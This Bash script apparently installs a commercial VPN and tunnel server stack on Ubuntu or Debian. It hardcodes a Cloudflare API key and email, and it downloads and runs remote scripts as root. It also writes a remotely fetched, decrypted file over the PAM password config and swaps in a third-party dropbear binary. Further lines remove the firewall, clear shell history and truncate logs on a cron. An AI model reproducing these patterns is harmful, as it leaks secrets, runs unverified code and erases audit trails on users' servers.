#!/bin/bash

apt update
apt install curl -y
apt install wget -y
apt install jq -y
apt install shc -y

NC='\033[0m'
rbg='\033[41;37m'
r='\033[1;91m'
g='\033[1;92m'
y='\033[1;93m'
u='\033[0;35m'
c='\033[0;96m'
w='\033[1;97m'

if [ "${EUID}" -ne 0 ]; then
echo "${r}You need to run this script as root${NC}"
sleep 2
exit 0
fi

if [[ ! -f /root/.isp ]]; then
curl -sS ipinfo.io/org?token=7a814b6263b02c > /root/.isp
fi
if [[ ! -f /root/.city ]]; then
curl -sS ipinfo.io/city?token=7a814b6263b02c > /root/.city
fi
if [[ ! -f /root/.myip ]]; then
curl -sS ipv4.icanhazip.com > /root/.myip
fi

export IP=$(cat /root/.myip);
export ISP=$(cat /root/.isp);
export CITY=$(cat /root/.city);


repo="https://raw.githubusercontent.com/Adidastore11/P/main/"

source /etc/os-release

function lane_atas() {
    echo -e "${c}┌──────────────────────────────────────────┐${NC}"
}
function lane_bawah() {
    echo -e "${c}└──────────────────────────────────────────┘${NC}"
}

apt update

# Cek arsitektur sistem
if [[ "$(uname -m)" == "x86_64" ]]; then
    echo -ne
else
    echo -e "${r} Your Architecture Is Not Supported ( ${y}$(uname -m)${NC} )"
    exit 1
fi

# Cek ID OS (ubuntu/debian)
if [[ ${ID} == "ubuntu" || ${ID} == "debian" ]]; then
    echo -ne
else
    echo -e " ${r}This Script only Support for OS"
    echo -e ""
    echo -e " - ${y}Ubuntu 18.04${NC}"
    echo -e " - ${y}Ubuntu 20.04${NC}"
    echo -e " - ${y}Ubuntu 22.04${NC}"
    echo -e " - ${y}Ubuntu 24.04${NC}"
    echo -e " - ${y}Ubuntu 24.10${NC}"
    echo ""
    echo -e " - ${y}Debian 10${NC}"
    echo -e " - ${y}Debian 11${NC}"
    echo -e " - ${y}Debian 12${NC}"
    echo -e "${r}Your OS is not supported.${NC}"
    exit 0
fi

# Cek versi ID OS
if [[ ${VERSION_ID} == "10" || ${VERSION_ID} == "11" || ${VERSION_ID} == "12" || \
      ${VERSION_ID} == "18.04" || ${VERSION_ID} == "20.04" || ${VERSION_ID} == "22.04" || \
      ${VERSION_ID} == "24.04" || ${VERSION_ID} == "24.10" ]]; then
    echo -ne
else
    echo -e " ${r}This Script only Support for OS"
    echo -e ""
    echo -e " - ${y}Ubuntu 18.04${NC}"
    echo -e " - ${y}Ubuntu 20.04${NC}"
    echo -e " - ${y}Ubuntu 22.04${NC}"
    echo -e " - ${y}Ubuntu 24.04${NC}"
    echo -e " - ${y}Ubuntu 24.10${NC}"
    echo ""
    echo -e " - ${y}Debian 10${NC}"
    echo -e " - ${y}Debian 11${NC}"
    echo -e " - ${y}Debian 12${NC}"
    echo -e "${r}Your OS version is not supported.${NC}"
    exit 0
fi

function generate_random_subdomain() {
sub=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
}

function pointing() (
    if [ -f /etc/xray/domain ] && [ -s /etc/xray/domain ]; then
        echo "Domain sudah ada, melewati proses pointing."
        return
    fi

    apt update
    apt install jq curl -y
    DOMAIN=klmpk.my.id
    generate_random_subdomain
    dns=${sub}.${DOMAIN}
    CF_KEY=9d25535086484fb695ab64a70a70532a32fd4
    CF_ID=Adidastore1141@gmail.com
    set -euo pipefail
    echo ""
    echo "Proses Pointing Domain ${dns}..."
    sleep 1
    ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMAIN}&status=active" \
         -H "X-Auth-Email: ${CF_ID}" \
         -H "X-Auth-Key: ${CF_KEY}" \
         -H "Content-Type: application/json" | jq -r .result[0].id)

    RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${dns}" \
         -H "X-Auth-Email: ${CF_ID}" \
         -H "X-Auth-Key: ${CF_KEY}" \
         -H "Content-Type: application/json" | jq -r .result[0].id)

    if [[ "${#RECORD}" -le 10 ]]; then
         RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
         -H "X-Auth-Email: ${CF_ID}" \
         -H "X-Auth-Key: ${CF_KEY}" \
         -H "Content-Type: application/json" \
         --data '{"type":"A","name":"'${dns}'","content":"'${IP}'","ttl":120,"proxied":true}' | jq -r .result.id)
    fi

    RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
         -H "X-Auth-Email: ${CF_ID}" \
         -H "X-Auth-Key: ${CF_KEY}" \
         -H "Content-Type: application/json" \
         --data '{"type":"A","name":"'${dns}'","content":"'${IP}'","ttl":120,"proxied":true}')

    # Menyimpan domain ke /etc/xray/domain hanya jika tidak ada
    echo "$dns" > /etc/xray/domain
    echo ""
    sleep 1
    echo -e "Subdomain kamu adalah ${dns}"
    cd
    sleep 2
)

function pasang_domain() {
    mkdir -p /etc/xray
    mkdir -p /var/lib/klmpk/ >/dev/null 2>&1
    echo "IP=" >> /var/lib/klmpk/ipvps.conf
    touch /etc/.{ssh,noobzvpns,vmess,vless,trojan,shadowsocks}.db
    mkdir -p /etc/{xray,bot,vmess,vless,trojan,shadowsocks,ssh,noobzvpns,limit,usr}
    touch /etc/noobzvpns/users.json
    mkdir -p /etc/xray/limit
    mkdir -p /etc/xray/limit/{ssh,vmess,vless,trojan,shadowsocks}
    mkdir -p /etc/klmpk/limit/vmess/ip
    mkdir -p /etc/klmpk/limit/vless/ip
    mkdir -p /etc/klmpk/limit/trojan/ip
    mkdir -p /etc/klmpk/limit/ssh/ip
    mkdir -p /etc/limit/vmess
    mkdir -p /etc/limit/vless
    mkdir -p /etc/limit/trojan
    mkdir -p /etc/limit/ssh
    mkdir -p /etc/vmess
    mkdir -p /etc/vless
    mkdir -p /etc/trojan
    mkdir -p /etc/shadowsocks
    mkdir -p /etc/ssh
    touch /etc/vmess/.vmess.db
    touch /etc/vless/.vless.db
    touch /etc/trojan/.trojan.db
    touch /etc/shadowsocks/.shadowsocks.db
    touch /etc/ssh/.ssh.db
    touch /etc/bot/.bot.db
    echo "& plughin Account" >>/etc/vmess/.vmess.db
    echo "& plughin Account" >>/etc/vless/.vless.db
    echo "& plughin Account" >>/etc/trojan/.trojan.db
    echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
    echo "& plughin Account" >>/etc/ssh/.ssh.db

pointing
}

function Dependencies() {
cd
echo "Process Install Dependencies"
sleep 1
apt update -y
apt install sudo -y
sudo apt-get clean all
apt install -y debconf-utils
apt install p7zip-full -y
apt-get remove --purge ufw firewalld -y
apt-get remove --purge exim4 -y
apt-get autoremove -y
apt install at -y
apt install -y --no-install-recommends software-properties-common
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
sudo DEBIAN_FRONTEND=noninteractive apt-get -y install iptables iptables-persistent netfilter-persistent libxml-parser-perl squid screen curl jq bzip2 gzip coreutils rsyslog zip unzip net-tools sed bc apt-transport-https build-essential dirmngr libxml-parser-perl lsof openvpn easy-rsa fail2ban tmux squid dropbear socat cron bash-completion ntpdate xz-utils apt-transport-https chrony pkg-config bison make git speedtest-cli p7zip-full zlib1g-dev python-is-python3 python3-pip shc build-essential nodejs nginx php php-fpm php-cli php-mysql p7zip-full squid libcurl4-openssl-dev

# remove unnecessary files
sudo apt-get autoclean -y >/dev/null 2>&1
audo apt-get -y --purge removd unscd >/dev/null 2>&1
sudo apt-get -y --purge remove samba* >/dev/null 2>&1
sudo apt-get -y --purge remove bind9* >/dev/null 2>&1
sudo apt-get -y remove sendmail* >/dev/null 2>&1
apt autoremove -y >/dev/null 2>&1
# finishing

echo "Dependencies successfully installed..."
sleep 1.5

wget -q -O /etc/port.txt "${repo}port.txt"

clear
start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
#apt install git curl -y >/dev/null 2>&1
#apt install python -y >/dev/null 2>&1
}

function Installasi() {

inssh() {
apt install netfilter-persistent -y
apt-get remove --purge ufw firewalld -y
apt install -y screen curl jq bzip2 gzip vnstat coreutils rsyslog zip unzip git apt-transport-https build-essential -y

export DEBIAN_FRONTEND=noninteractive
MYIP2="s/xxxxxxxxx/$IP/g"
NET=$(ip -o $ANU -4 route show to default | awk '{print $5}')
if [[ -f /etc/os-release ]]; then
    . /etc/os-release
    OS_NAME=$ID
    OS_VERSION=$VERSION_ID

    echo "Menemukan sistem operasi: $OS_NAME $OS_VERSION"
else
    echo "Tidak dapat menentukan sistem operasi."
    exit 1
fi

#detail nama perusahaan
country=ID
state=Indonesia
locality=Jakarta
organization=none
organizationalunit=none
commonname=none
email=none

# simple password minimal
curl -sS ${repo}ssh/password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
chmod +x /etc/pam.d/common-password

# go to root
cd

# Edit file /etc/systemd/system/rc-local.service
cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END

# nano /etc/rc.local
cat > /etc/rc.local <<-END
#!/bin/sh -e
# rc.local
# By default this script does nothing.
exit 0
END

# Ubah izin akses
chmod +x /etc/rc.local

# enable rc local
systemctl enable rc-local
systemctl start rc-local.service

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

#update
apt update -y
apt upgrade -y
apt dist-upgrade -y
apt-get remove --purge ufw firewalld -y
apt-get remove --purge exim4 -y

#install jq
apt -y install jq

#install shc
apt -y install shc

# install wget and curl
apt -y install wget curl

#figlet
apt-get install figlet -y
apt-get install ruby -y
gem install lolcat

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config

# // install
apt-get --reinstall --fix-missing install -y bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr libxml-parser-perl neofetch git lsof


# install webserver
apt -y install nginx php php-fpm php-cli php-mysql libxml-parser-perl
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
curl ${repo}ssh/nginx.conf > /etc/nginx/nginx.conf
#curl ${repo}ssh/vps.conf > /etc/nginx/conf.d/vps.conf
sed -i 's/listen = \/var\/run\/php-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/fpm/pool.d/www.conf
mkdir -p /var/www/html
echo "<?php phpinfo() ?>" > /var/www/html/info.php
chown -R www-data:www-data /var/www/html
chmod -R g+rw /var/www/html
cd /var/www/html

cat > /var/www/html/index.html <<-END
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<kepala>
<meta http-equiv="REFRESH" content="0;url=https://wa.me/082131861788">
</kepala>
<tubuh>
<p>Pengalihan URL</p>
</tubuh>
</html>
END
/etc/init.d/nginx restart

# install badvpn
cd
wget -O /usr/sbin/badvpn "${repo}ssh/badvpn" >/dev/null 2>&1
chmod +x /usr/sbin/badvpn > /dev/null 2>&1
wget -q -O /etc/systemd/system/badvpn1.service "${repo}ssh/badvpn1.service" >/dev/null 2>&1
wget -q -O /etc/systemd/system/badvpn2.service "${repo}ssh/badvpn2.service" >/dev/null 2>&1
wget -q -O /etc/systemd/system/badvpn3.service "${repo}ssh/badvpn3.service" >/dev/null 2>&1
systemctl disable badvpn1 
systemctl stop badvpn1 
systemctl enable badvpn1
systemctl start badvpn1 
systemctl disable badvpn2 
systemctl stop badvpn2 
systemctl enable badvpn2
systemctl start badvpn2 
systemctl disable badvpn3 
systemctl stop badvpn3 
systemctl enable badvpn3
systemctl start badvpn3 


# setting port ssh
cd
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 500' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 40000' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 51443' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 58080' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 200' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 22' /etc/ssh/sshd_config
/etc/init.d/ssh restart

echo "=== Install Dropbear ==="
# install dropbear
apt -y install dropbear
sudo dropbearkey -t dss -f /etc/dropbear/dropbear_dss_host_key
sudo chmod 600 /etc/dropbear/dropbear_dss_host_key
wget -O /etc/default/dropbear "${repo}ssh/dropbear"
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
wget -q -O dropbear_2019 "https://github.com/goldax7/os/raw/main/dropbear_v2019.78"
chmod 700 dropbear_2019
mv dropbear_2019 /usr/sbin/dropbear
systemctl restart dropbear


detect_os() {
  if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    echo "$ID $VERSION_ID"
  else
    echo "Unknown"
  fi
}

os_version=$(detect_os)
if [[ "$os_version" =~ "ubuntu 24" ]]; then 
  RSYSLOG_FILE="/etc/rsyslog.d/50-default.conf"
elif [[ "$os_version" == "debian 12" ]]; then
  RSYSLOG_FILE="/etc/rsyslog.conf"
else
  echo "Sistem operasi atau versi tidak dikenali. Keluar..."
  #exit 1
fi

LOG_FILES=(
  "/var/log/auth.log"
  "/var/log/kern.log"
  "/var/log/mail.log"
  "/var/log/user.log"
  "/var/log/cron.log"
)

for log_file in "${LOG_FILES[@]}"; do
touch $log_file
done

set_permissions() {
  for log_file in "${LOG_FILES[@]}"; do
    if [[ -f "$log_file" ]]; then
      echo "Mengatur izin dan kepemilikan untuk $log_file..."
      chmod 640 "$log_file"
      chown syslog:adm "$log_file"
    else
      echo "$log_file tidak ditemukan, melewati..."
    fi
  done
}

# Mengecek apakah konfigurasi untuk dropbear sudah ada
check_dropbear_log() {
  grep -q 'if \$programname == "dropbear"' "$RSYSLOG_FILE"
}

# Fungsi untuk menambahkan konfigurasi dropbear
add_dropbear_log() {
  echo "Menambahkan konfigurasi Dropbear ke $RSYSLOG_FILE..."
  sudo bash -c "echo -e 'if \$programname == \"dropbear\" then /var/log/auth.log\n& stop' >> $RSYSLOG_FILE"
  systemctl restart rsyslog
  echo "Konfigurasi Dropbear ditambahkan dan Rsyslog direstart."
}

if check_dropbear_log; then
  echo "Konfigurasi Dropbear sudah ada, tidak ada perubahan yang dilakukan."
else
  add_dropbear_log
fi

# Set permissions untuk file log
set_permissions

if [[ "$OS_NAME" == "debian" && "$OS_VERSION" == "10" ]] || [[ "$OS_NAME" == "ubuntu" && "$OS_VERSION" == "20.04" ]]; then
    echo "Menginstal squid3 untuk Debian 10 atau Ubuntu 20.04..."
    apt -y install squid3
else
    echo "Menginstal squid untuk versi lain..."
    apt -y install squid
fi
# Unduh file konfigurasi
echo "Mengunduh file konfigurasi Squid..."
wget -O /etc/squid/squid.conf "${repo}ssh/squid3.conf"

# Ganti placeholder dengan alamat IP
echo "Mengganti placeholder IP dengan alamat IP saat ini..."
sed -i $MYIP2 /etc/squid/squid.conf

echo "Instalasi dan konfigurasi Squid selesai."
# setting vnstat
apt -y install vnstat
/etc/init.d/vnstat restart
apt -y install libsqlite3-dev
wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc && make && make install
cd
vnstat -i $NET
sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
/etc/init.d/vnstat restart
rm -f /root/vnstat-2.6.tar.gz
rm -rf /root/vnstat-2.6

cd

#OpenVPN
# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
IP=$(cat /root/.myip);
MYIP2="s/xxxxxxxxx/$IP/g";
ANU=$(ip -o $ANU -4 route show to default | awk '{print $5}');

# Install OpenVPN dan Easy-RSA
apt install openvpn easy-rsa unzip -y
apt install openssl iptables iptables-persistent -y
mkdir -p /etc/openvpn/server/easy-rsa/
cd /etc/openvpn/
wget ${repo}ssh/vpn.zip
unzip vpn.zip
rm -f vpn.zip
chown -R root:root /etc/openvpn/server/easy-rsa/

cd
mkdir -p /usr/lib/openvpn/
cp /usr/lib/x86_64-linux-gnu/openvpn/plugins/openvpn-plugin-auth-pam.so /usr/lib/openvpn/openvpn-plugin-auth-pam.so

# nano /etc/default/openvpn
sed -i 's/#AUTOSTART="all"/AUTOSTART="all"/g' /etc/default/openvpn

# restart openvpn dan cek status openvpn
systemctl enable --now openvpn-server@server-tcp
systemctl enable --now openvpn-server@server-udp
/etc/init.d/openvpn restart
/etc/init.d/openvpn status

# aktifkan ip4 forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf

# Buat config client TCP 1194
cat > /etc/openvpn/tcp.ovpn <<-END
client
dev tun
proto tcp
remote xxxxxxxxx 1194
resolv-retry infinite
route-method exe
nobind
persist-key
persist-tun
auth-user-pass
comp-lzo
verb 3
END

sed -i $MYIP2 /etc/openvpn/tcp.ovpn;

# Buat config client UDP 2200
cat > /etc/openvpn/udp.ovpn <<-END
client
dev tun
proto udp
remote xxxxxxxxx 2200
resolv-retry infinite
route-method exe
nobind
persist-key
persist-tun
auth-user-pass
comp-lzo
verb 3
END

sed -i $MYIP2 /etc/openvpn/udp.ovpn;

# Buat config client SSL
cat > /etc/openvpn/ssl.ovpn <<-END
client
dev tun
proto tcp
remote xxxxxxxxx 990
resolv-retry infinite
route-method exe
nobind
persist-key
persist-tun
auth-user-pass
comp-lzo
verb 3
END

sed -i $MYIP2 /etc/openvpn/ssl.ovpn;

cd
# pada tulisan xxx ganti dengan alamat ip address VPS anda
/etc/init.d/openvpn restart

# masukkan certificatenya ke dalam config client TCP 1194
echo '<ca>' >> /etc/openvpn/tcp.ovpn
cat /etc/openvpn/server/ca.crt >> /etc/openvpn/tcp.ovpn
echo '</ca>' >> /etc/openvpn/tcp.ovpn

# Copy config OpenVPN client ke home directory root agar mudah didownload ( TCP 1194 )
cp /etc/openvpn/tcp.ovpn /var/www/html/tcp.ovpn

# masukkan certificatenya ke dalam config client UDP 2200
echo '<ca>' >> /etc/openvpn/udp.ovpn
cat /etc/openvpn/server/ca.crt >> /etc/openvpn/udp.ovpn
echo '</ca>' >> /etc/openvpn/udp.ovpn

# Copy config OpenVPN client ke home directory root agar mudah didownload ( UDP 2200 )
cp /etc/openvpn/udp.ovpn /var/www/html/udp.ovpn

# masukkan certificatenya ke dalam config client SSL
echo '<ca>' >> /etc/openvpn/ssl.ovpn
cat /etc/openvpn/server/ca.crt >> /etc/openvpn/ssl.ovpn
echo '</ca>' >> /etc/openvpn/ssl.ovpn

# Copy config OpenVPN client ke home directory root agar mudah didownload ( SSL )
cp /etc/openvpn/ssl.ovpn /var/www/html/ssl.ovpn

#firewall untuk memperbolehkan akses UDP dan akses jalur TCP

iptables -t nat -I POSTROUTING -s 10.6.0.0/24 -o $ANU -j MASQUERADE
iptables -t nat -I POSTROUTING -s 10.7.0.0/24 -o $ANU -j MASQUERADE
iptables-save > /etc/iptables.up.rules
chmod +x /etc/iptables.up.rules

iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload

# Restart service openvpn
systemctl enable openvpn
systemctl start openvpn
/etc/init.d/openvpn restart

# Delete script
history -c


apt-get install ruby -y
gem install lolcat

# memory swap 2gb
cd
# Buat swap sebesar 2GB
dd if=/dev/zero of=/swapfile bs=1M count=2048
mkswap /swapfile
chown root:root /swapfile
chmod 0600 /swapfile
swapon /swapfile
sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab
chronyd -q 'server 0.id.pool.ntp.org iburst'
chronyc sourcestats -v
chronyc tracking -v

# install fail2ban
apt -y install fail2ban

# Instal DDOS Flate
if [ -d '/usr/local/ddos' ]; then
	echo; echo; echo "Please un-install the previous version first"
	exit 0
else
	mkdir /usr/local/ddos
fi
clear
echo; echo 'Installing DOS-Deflate 0.6'; echo
echo; echo -n 'Downloading source files...'

download_file() {
    local url="$1"
    local dest="$2"
    if wget --timeout=10 --tries=3 -q -O "$dest" "$url"; then
        echo -n '.'
    else
        echo " [FAILED]"
    fi
}

download_file "http://www.inetbase.com/scripts/ddos/ddos.conf" "/usr/local/ddos/ddos.conf"
download_file "http://www.inetbase.com/scripts/ddos/LICENSE" "/usr/local/ddos/LICENSE"
download_file "http://www.inetbase.com/scripts/ddos/ignore.ip.list" "/usr/local/ddos/ignore.ip.list"
download_file "http://www.inetbase.com/scripts/ddos/ddos.sh" "/usr/local/ddos/ddos.sh"

if [ -f /usr/local/ddos/ddos.sh ]; then
    chmod 0755 /usr/local/ddos/ddos.sh
    cp -s /usr/local/ddos/ddos.sh /usr/local/bin/ddos
    echo '...done'

    echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
    /usr/local/ddos/ddos.sh --cron > /dev/null 2>&1 && echo '.....done' || echo ' [FAILED]'
else
    echo "Installation failed: ddos.sh not found!"
    exit 1
fi

echo; echo 'Installation has completed.'
echo 'Config file is at /usr/local/ddos/ddos.conf'

# banner /etc/issue.net
echo "Banner /etc/issue.net" >>/etc/ssh/sshd_config

# Ganti Banner
cat > /etc/issue.net << END
happy conneting

<p style="text-align: center;">
    <span style="color: #41A85F; font-size: 26px;"><strong>KLMPK VPN</strong></span>
    <span style="font-size: 26px;"><strong> </strong></span>
    <span style="color: #F37934; font-size: 26px;"><strong>PREMIUM</strong></span>
    <span style="font-size: 26px;">&nbsp;</span>
</p>
<p style="text-align: center;">
    <span style="font-family: 'Trebuchet MS', Helvetica, sans-serif;">
        <span style="color: #E25041; background-color: #61BD6D;">Blitar Jatim</span>
        <span style="background-color: #61BD6D;">&nbsp;</span>
    </span>
</p>
<p style="text-align: center;">
    <span style="color: #B8312F;">Telp/WhatsApp</span>:
    <span style="color: #EFEFEF;">082131861788</span>
</p>
END

#install bbr dan optimasi kernel
wget -q ${repo}ssh/bbr.sh && chmod +x bbr.sh && ./bbr.sh

wget -q ${repo}ssh/ipserver && chmod +x ipserver && ./ipserver
# blokir torrent
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload

cd

    cat >/etc/cron.d/xp_all <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		2 0 * * * root /usr/bin/xp
	END
    cat >/etc/cron.d/logclean <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		*/59 * * * * root /usr/bin/logclean
	END
	    cat >/etc/cron.d/daily_reboot <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		0 5 * * * /sbin/reboot
	END

cat> /etc/cron.d/auto_exp << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 0 * * * root /usr/local/sbin/xp
END

cat> /etc/cron.d/daily_backup << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 22 * * * root /usr/local/sbin/backup
END

cat >/etc/cron.d/logclean <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root truncate -s 0 /var/log/syslog \
    && truncate -s 0 /var/log/nginx/error.log \
    && truncate -s 0 /var/log/nginx/access.log \
    && truncate -s 0 /var/log/xray/error.log \
    && truncate -s 0 /var/log/xray/access.log
END

cat >/etc/cron.d/daily_reboot <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
5 0 * * * root /sbin/reboot
END

service cron restart >/dev/null 2>&1
service cron reload >/dev/null 2>&1
service cron start >/dev/null 2>&1

# remove unnecessary files
apt autoclean -y >/dev/null 2>&1
apt -y remove --purge unscd >/dev/null 2>&1
apt-get -y --purge remove samba* >/dev/null 2>&1
apt-get -y --purge remove apache2* >/dev/null 2>&1
apt-get -y --purge remove bind9* >/dev/null 2>&1
apt-get -y remove sendmail* >/dev/null 2>&1
apt autoremove -y >/dev/null 2>&1
# finishing
cd
chown -R www-data:www-data /var/www/html

rm -f /root/key.pem
rm -f /root/cert.pem
rm -f /root/bbr.sh
rm -rf /etc/apache2

# installer gotop
gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
curl -sL "$gotop_link" -o /tmp/gotop.deb
dpkg -i /tmp/gotop.deb

wget -q https://raw.githubusercontent.com/Adidastore11/P/main/menu/update.sh && chmod +x update.sh && ./update.sh

clear
} 

insxray() {
cd
sleep 0.5
echo -e "[ INFO ] Checking... "
apt install iptables iptables-persistent -y
sleep 0.5
echo -e "[ INFO ] Setting ntpdate"
ntpdate pool.ntp.org
timedatectl set-ntp true
sleep 0.5
echo -e "[ INFO ] Enable chrony"
systemctl enable chrony
systemctl restart chrony
timedatectl set-timezone Asia/Jakarta
sleep 0.5
echo -e "[ INFO ] Setting chrony tracking"
chronyc sourcestats -v
chronyc tracking -v
echo -e "[ INFO ] Setting dll"
apt clean all && apt update
apt install curl socat xz-utils wget apt-transport-https gnupg gnupg2 gnupg1 dnsutils lsb-release -y
apt install socat cron bash-completion ntpdate -y
ntpdate pool.ntp.org
apt -y install chrony
apt install zip -y
apt install curl pwgen openssl cron -y

# install xray
sleep 0.5
echo -e "[ INFO ] Downloading & Installing xray core"
domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
chown www-data.www-data $domainSock_dir
# Make Folder XRay
mkdir -p /var/log/xray
mkdir -p /etc/xray
chown www-data.www-data /var/log/xray
chmod +x /var/log/xray
touch /var/log/xray/access.log
touch /var/log/xray/error.log
touch /var/log/xray/access2.log
touch /var/log/xray/error2.log
# / / Ambil Xray Core Version Terbaru
latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version 1.8.1

    # > Create Service
    rm -rf /etc/systemd/system/xray.service.d
    cat >/etc/systemd/system/xray.service <<EOF
Description=Xray Service
Documentation=https://github.com
After=network.target nss-lookup.target

[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target

EOF

uuid=$(cat /proc/sys/kernel/random/uuid)

## crt xray
systemctl stop nginx
domain=$(cat /etc/xray/domain)
mkdir /root/.acme.sh
curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
chmod +x /root/.acme.sh/acme.sh
/root/.acme.sh/acme.sh --upgrade --auto-upgrade
/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
/root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc

# nginx renew ssl
echo -n '#!/bin/bash
/etc/init.d/nginx stop
"/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" &> /root/renew_ssl.log
/etc/init.d/nginx start
/etc/init.d/nginx status
' > /usr/local/bin/ssl_renew.sh
chmod +x /usr/local/bin/ssl_renew.sh
if ! grep -q 'ssl_renew.sh' /var/spool/cron/crontabs/root;then (crontab -l;echo "15 03 */3 * * /usr/local/bin/ssl_renew.sh") | crontab;fi

mkdir -p /var/www/html
cd
#sed -i "s/xxx/${uuid}/g" /etc/xray/*.json
#sed -i 's/xxx/$domain/' /etc/nginx/conf.d/xray.conf

apt install haproxy -y
rm -f /etc/haproxy/haproxy.cfg
wget -q -O /etc/nginx/conf.d/xray.conf "${repo}xray/xray.conf"
wget -q -O /etc/haproxy/haproxy.cfg "${repo}xray/haproxy.cfg"
sed -i 's/xxx/$domain/' /etc/nginx/conf.d/xray.conf
sed -i 's/xxx/$domain/' /etc/haproxy/haproxy.cfg
